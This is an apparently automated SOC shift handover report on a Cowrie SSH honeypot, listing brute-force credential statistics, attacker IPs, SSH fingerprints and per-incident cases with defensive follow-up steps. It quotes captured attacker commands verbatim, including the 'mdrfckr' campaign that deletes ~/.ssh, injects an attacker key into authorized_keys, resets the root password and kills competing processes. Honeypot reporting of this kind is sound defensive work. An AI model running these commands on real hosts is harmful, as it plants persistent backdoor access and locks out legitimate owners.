# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-15 |
| **Generated At** | 2026-05-15T06:59:20Z |
| **Shift Time** | 06:59 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **530** |
| Confirmed Threats | **468** |
| False Positives Filtered | **62** (11.7%) |
| Unique Attacker IPs | **30** |
| Countries of Origin | **15** |
| High Severity Cases | **76** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **454** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **139** |
| Unique Credential Pairs | **62** |
| Unique Usernames | **25** |
| Unique Passwords | **58** |
| Successful Auth Pairs | **46** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 76 |
| `345gs5662d34` | 37 |
| `zhxnephu` | 2 |
| `linux` | 2 |
| `pakchoi` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 37 |
| `3245gs5662d34` | 36 |
| `linux123` | 5 |
| `warnight` | 4 |
| `root444` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 37 |
| `root` | `3245gs5662d34` | 36 |
| `root` | `linux123` | 3 |
| `root` | `root444` | 2 |
| `zhxnephu` | `zXXUKpvydMqzp1quBItn` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qwerty12345` | `117.205.3.26` | 2026-05-15T03:51:50 |
| `root` | `root444` | `186.235.193.170` | 2026-05-15T04:07:38 |
| `root` | `root444` | `76.124.3.157` | 2026-05-15T04:07:51 |
| `root` | `Root2025!` | `79.6.181.193` | 2026-05-15T04:33:21 |
| `root` | `3245gs5662d34` | `79.6.181.193` | 2026-05-15T04:33:24 |
| `root` | `domain` | `101.36.107.233` | 2026-05-15T04:53:35 |
| `root` | `3245gs5662d34` | `101.36.107.233` | 2026-05-15T04:53:39 |
| `root` | `alexalex` | `222.124.177.148` | 2026-05-15T04:57:10 |
| `root` | `3245gs5662d34` | `222.124.177.148` | 2026-05-15T04:57:13 |
| `root` | `asimov` | `222.124.177.148` | 2026-05-15T04:58:47 |
| `root` | `potato123` | `222.124.177.148` | 2026-05-15T05:00:19 |
| `root` | `1111111111` | `222.124.177.148` | 2026-05-15T05:02:00 |
| `root` | `123@admin` | `222.124.177.148` | 2026-05-15T05:03:29 |
| `root` | `apples123` | `222.124.177.148` | 2026-05-15T05:05:00 |
| `root` | `eleven` | `222.124.177.148` | 2026-05-15T05:06:29 |
| `root` | `Aa123456..` | `222.124.177.148` | 2026-05-15T05:07:58 |
| `root` | `cde3CDE#` | `82.169.135.117` | 2026-05-15T05:10:40 |
| `root` | `3245gs5662d34` | `82.169.135.117` | 2026-05-15T05:10:46 |
| `root` | `casper` | `222.124.177.148` | 2026-05-15T05:11:02 |
| `root` | `1z2x3c4v` | `222.124.177.148` | 2026-05-15T05:12:36 |
| `root` | `Florinlaur2005` | `82.169.135.117` | 2026-05-15T05:13:24 |
| `root` | `Heslo123` | `82.169.135.117` | 2026-05-15T05:17:02 |
| `root` | `linux123` | `222.124.177.148` | 2026-05-15T05:20:05 |
| `root` | `vmware123` | `222.124.177.148` | 2026-05-15T05:21:33 |
| `root` | `alexander` | `82.169.135.117` | 2026-05-15T05:22:59 |
| `root` | `r123456` | `222.124.177.148` | 2026-05-15T05:23:06 |
| `root` | `mamaliga` | `222.124.177.148` | 2026-05-15T05:24:37 |
| `root` | `qweASD123!@#` | `82.169.135.117` | 2026-05-15T05:25:31 |
| `root` | `fuckme` | `222.124.177.148` | 2026-05-15T05:26:06 |
| `root` | `linux123` | `82.169.135.117` | 2026-05-15T05:26:52 |
| `root` | `satheesh` | `222.124.177.148` | 2026-05-15T05:29:12 |
| `root` | `126.com` | `222.124.177.148` | 2026-05-15T05:30:47 |
| `root` | `aa123456A` | `82.169.135.117` | 2026-05-15T05:31:38 |
| `root` | `1422` | `222.124.177.148` | 2026-05-15T05:32:17 |
| `root` | `Pass@word` | `82.169.135.117` | 2026-05-15T05:32:52 |
| `root` | `florence` | `222.124.177.148` | 2026-05-15T05:33:46 |
| `root` | `server_123` | `82.169.135.117` | 2026-05-15T05:34:02 |
| `root` | `qweasd123` | `82.169.135.117` | 2026-05-15T05:35:14 |
| `root` | `Pass123@` | `222.124.177.148` | 2026-05-15T05:35:17 |
| `root` | `steak123` | `222.124.177.148` | 2026-05-15T05:36:49 |
| `root` | `linux123` | `102.23.122.235` | 2026-05-15T05:39:16 |
| `root` | `3245gs5662d34` | `102.23.122.235` | 2026-05-15T05:39:22 |
| `root` | `Admin@123123` | `82.169.135.117` | 2026-05-15T05:41:34 |
| `root` | `shop` | `113.193.234.210` | 2026-05-15T05:42:15 |
| `root` | `3245gs5662d34` | `113.193.234.210` | 2026-05-15T05:42:16 |
| `root` | `stephan` | `121.229.9.97` | 2026-05-15T05:43:58 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **530** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 145 |
| OpenSSH | 3 |
| Unknown | 2 |
| Go SSH scanner | 2 |
| Nmap scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 139 | 7 |
| `03a80b21afa8...` | Modern SSH client | 5 | 3 |
| `acaa53e0a7d7...` | Mirai/variant | 3 | 3 |
| `d6729b7f2442...` | Mirai/variant | 1 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 139 | 7 | Mirai/variant |
| `03a80b21afa8...` | libssh | 5 | 3 | Modern SSH client |
| `acaa53e0a7d7...` | OpenSSH | 3 | 3 | Mirai/variant |
| `d6729b7f2442...` | Paramiko (Python) | 1 | 1 | Mirai/variant |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `4e066189c3bb...` | Unknown | 1 | 1 | Generic scanner |
| `dde267e50f82...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | Nmap scanner | 1 | 1 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 36 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:RFGOesaeOP6B"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `121.229.9.97`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `101.36.107.233`, `222.124.177.148`, `82.169.135.117`, `102.23.122.235`, `113.193.234.210`, `79.6.181.193`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **30** |
| Unique ASNs | **26** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 4 | HIGH |
| `AS396982` | Google LLC | 2 | HIGH |
| `AS328646` | INFRATEL CORPORATION LIMITED | 1 | HIGH |
| `AS14593` | Space Exploration Technologies Corporation | 1 | LOW |
| `AS262673` | VERO S.A | 1 | HIGH |
| `AS17072` | TOTAL PLAY TELECOMUNICACIONES, S.A.P.I. DE C.V. | 1 | LOW |
| `AS19331` | Twin Lakes Telephone Cooperative Corporation | 1 | MEDIUM |
| `AS4766` | Korea Telecom | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (76)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-d59d7998a4bc

| Field | Detail |
|---|---|
| **Source IP** | `117.205.3[.]26` |
| **First Seen** | 2026-05-15 03:51 |
| **Last Seen** | 2026-05-15 03:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 03:51:49` | `cowrie.session.connect` |
| `2026-05-15 03:51:49` | `cowrie.client.version` |
| `2026-05-15 03:51:49` | `cowrie.client.kex` |
| `2026-05-15 03:51:50` | `cowrie.login.success` |
| `2026-05-15 03:51:51` | `cowrie.direct-tcpip.request` |
| `2026-05-15 03:51:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.205.3[.]26` to AbuseIPDB if not already reported
- [ ] Block `117.205.3[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18dcadbb120d

| Field | Detail |
|---|---|
| **Source IP** | `186.235.193[.]170` |
| **First Seen** | 2026-05-15 04:07 |
| **Last Seen** | 2026-05-15 04:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 04:07:35` | `cowrie.session.connect` |
| `2026-05-15 04:07:36` | `cowrie.client.version` |
| `2026-05-15 04:07:36` | `cowrie.client.kex` |
| `2026-05-15 04:07:38` | `cowrie.login.success` |
| `2026-05-15 04:07:39` | `cowrie.direct-tcpip.request` |
| `2026-05-15 04:07:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.235.193[.]170` to AbuseIPDB if not already reported
- [ ] Block `186.235.193[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32276ac4d339

| Field | Detail |
|---|---|
| **Source IP** | `76.124.3[.]157` |
| **First Seen** | 2026-05-15 04:07 |
| **Last Seen** | 2026-05-15 04:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 04:07:48` | `cowrie.session.connect` |
| `2026-05-15 04:07:49` | `cowrie.client.version` |
| `2026-05-15 04:07:49` | `cowrie.client.kex` |
| `2026-05-15 04:07:51` | `cowrie.login.success` |
| `2026-05-15 04:07:51` | `cowrie.direct-tcpip.request` |
| `2026-05-15 04:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.124.3[.]157` to AbuseIPDB if not already reported
- [ ] Block `76.124.3[.]157` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9204450b9ce

| Field | Detail |
|---|---|
| **Source IP** | `79.6.181[.]193` |
| **First Seen** | 2026-05-15 04:33 |
| **Last Seen** | 2026-05-15 04:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 04:33:20` | `cowrie.session.connect` |
| `2026-05-15 04:33:20` | `cowrie.client.version` |
| `2026-05-15 04:33:20` | `cowrie.client.kex` |
| `2026-05-15 04:33:21` | `cowrie.login.success` |
| `2026-05-15 04:33:21` | `cowrie.session.params` |
| `2026-05-15 04:33:21` | `cowrie.command.input` |
| `2026-05-15 04:33:21` | `cowrie.command.failed` |
| `2026-05-15 04:33:21` | `cowrie.log.closed` |
| `2026-05-15 04:33:21` | `cowrie.session.params` |
| `2026-05-15 04:33:21` | `cowrie.command.input` |
| `2026-05-15 04:33:22` | `cowrie.session.file_download` |
| `2026-05-15 04:33:22` | `cowrie.log.closed` |
| `2026-05-15 04:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.6.181[.]193` to AbuseIPDB if not already reported
- [ ] Block `79.6.181[.]193` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-585727a4e7e5

| Field | Detail |
|---|---|
| **Source IP** | `79.6.181[.]193` |
| **First Seen** | 2026-05-15 04:33 |
| **Last Seen** | 2026-05-15 04:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 04:33:24` | `cowrie.session.connect` |
| `2026-05-15 04:33:24` | `cowrie.client.version` |
| `2026-05-15 04:33:24` | `cowrie.client.kex` |
| `2026-05-15 04:33:24` | `cowrie.login.success` |
| `2026-05-15 04:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.6.181[.]193` to AbuseIPDB if not already reported
- [ ] Block `79.6.181[.]193` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5fa1e272d16

| Field | Detail |
|---|---|
| **Source IP** | `101.36.107[.]233` |
| **First Seen** | 2026-05-15 04:53 |
| **Last Seen** | 2026-05-15 04:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 04:53:35` | `cowrie.session.connect` |
| `2026-05-15 04:53:35` | `cowrie.client.version` |
| `2026-05-15 04:53:35` | `cowrie.client.kex` |
| `2026-05-15 04:53:35` | `cowrie.login.success` |
| `2026-05-15 04:53:36` | `cowrie.session.params` |
| `2026-05-15 04:53:36` | `cowrie.command.input` |
| `2026-05-15 04:53:36` | `cowrie.command.failed` |
| `2026-05-15 04:53:36` | `cowrie.log.closed` |
| `2026-05-15 04:53:36` | `cowrie.session.params` |
| `2026-05-15 04:53:36` | `cowrie.command.input` |
| `2026-05-15 04:53:36` | `cowrie.session.file_download` |
| `2026-05-15 04:53:36` | `cowrie.log.closed` |
| `2026-05-15 04:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.107[.]233` to AbuseIPDB if not already reported
- [ ] Block `101.36.107[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d41193559e6

| Field | Detail |
|---|---|
| **Source IP** | `101.36.107[.]233` |
| **First Seen** | 2026-05-15 04:53 |
| **Last Seen** | 2026-05-15 04:53 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 04:53:38` | `cowrie.session.connect` |
| `2026-05-15 04:53:38` | `cowrie.client.version` |
| `2026-05-15 04:53:38` | `cowrie.client.kex` |
| `2026-05-15 04:53:39` | `cowrie.login.success` |
| `2026-05-15 04:53:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.107[.]233` to AbuseIPDB if not already reported
- [ ] Block `101.36.107[.]233` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c497cbf3d9e3

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 04:57 |
| **Last Seen** | 2026-05-15 04:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 04:57:09` | `cowrie.session.connect` |
| `2026-05-15 04:57:09` | `cowrie.client.version` |
| `2026-05-15 04:57:09` | `cowrie.client.kex` |
| `2026-05-15 04:57:10` | `cowrie.login.success` |
| `2026-05-15 04:57:10` | `cowrie.session.params` |
| `2026-05-15 04:57:10` | `cowrie.command.input` |
| `2026-05-15 04:57:10` | `cowrie.command.failed` |
| `2026-05-15 04:57:10` | `cowrie.log.closed` |
| `2026-05-15 04:57:11` | `cowrie.session.params` |
| `2026-05-15 04:57:11` | `cowrie.command.input` |
| `2026-05-15 04:57:11` | `cowrie.session.file_download` |
| `2026-05-15 04:57:11` | `cowrie.log.closed` |
| `2026-05-15 04:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8794213946b

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 04:57 |
| **Last Seen** | 2026-05-15 04:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 04:57:13` | `cowrie.session.connect` |
| `2026-05-15 04:57:13` | `cowrie.client.version` |
| `2026-05-15 04:57:13` | `cowrie.client.kex` |
| `2026-05-15 04:57:13` | `cowrie.login.success` |
| `2026-05-15 04:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-647e590c5438

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 04:58 |
| **Last Seen** | 2026-05-15 04:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 04:58:46` | `cowrie.session.connect` |
| `2026-05-15 04:58:46` | `cowrie.client.version` |
| `2026-05-15 04:58:46` | `cowrie.client.kex` |
| `2026-05-15 04:58:47` | `cowrie.login.success` |
| `2026-05-15 04:58:47` | `cowrie.session.params` |
| `2026-05-15 04:58:47` | `cowrie.command.input` |
| `2026-05-15 04:58:47` | `cowrie.command.failed` |
| `2026-05-15 04:58:47` | `cowrie.log.closed` |
| `2026-05-15 04:58:47` | `cowrie.session.params` |
| `2026-05-15 04:58:47` | `cowrie.command.input` |
| `2026-05-15 04:58:47` | `cowrie.session.file_download` |
| `2026-05-15 04:58:47` | `cowrie.log.closed` |
| `2026-05-15 04:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dd6bb7a2a42

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 04:58 |
| **Last Seen** | 2026-05-15 04:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 04:58:50` | `cowrie.session.connect` |
| `2026-05-15 04:58:50` | `cowrie.client.version` |
| `2026-05-15 04:58:50` | `cowrie.client.kex` |
| `2026-05-15 04:58:50` | `cowrie.login.success` |
| `2026-05-15 04:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.124.177[.]148` to AbuseIPDB if not already reported
- [ ] Block `222.124.177[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be0a8d244928

| Field | Detail |
|---|---|
| **Source IP** | `222.124.177[.]148` |
| **First Seen** | 2026-05-15 05:00 |
| **Last Seen** | 2026-05-15 05:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
